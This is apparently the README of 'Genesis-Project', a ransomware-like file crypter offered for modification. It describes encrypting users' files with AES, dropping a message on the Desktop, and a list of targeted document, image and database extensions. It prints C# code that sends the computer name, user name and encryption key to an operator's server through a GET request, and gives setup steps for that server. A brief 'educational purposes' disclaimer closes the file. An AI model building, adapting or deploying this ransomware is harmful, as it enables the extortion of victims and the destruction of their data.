# Genesis-Project

It's a ransomware-like file crypter sample which can be modified for specific purposes. 

## **Features**
* Uses AES algorithm to encrypt files.
* Sends encryption key to a server.
* Encrypted files can be decrypt in decrypter program with encryption key.
* Creates a text file in Desktop with given message.
* Small file size (12 KB)

## **Usage**


* You need to have a web server which supports scripting languages like php,python etc. Change this line with your URL. (You better use Https connection to avoid eavesdropping)

  `string targetURL = "https://www.example.com/genesis-project/write.php?info=";`

* The script should writes the GET parameter to a text file. Sending process running in `SendPassword()` function

  ```
  string info = computerName + "-" + userName + " " + password;
  var fullUrl = targetURL + info;
  var conent = new System.Net.WebClient().DownloadString(fullUrl);
  
  ```
* Target file extensions can be change. Default list:

```
var validExtensions = new[]{".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
```
## **Legal Warning** 

While this may be helpful for some, there are significant risks. Genesis Project may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
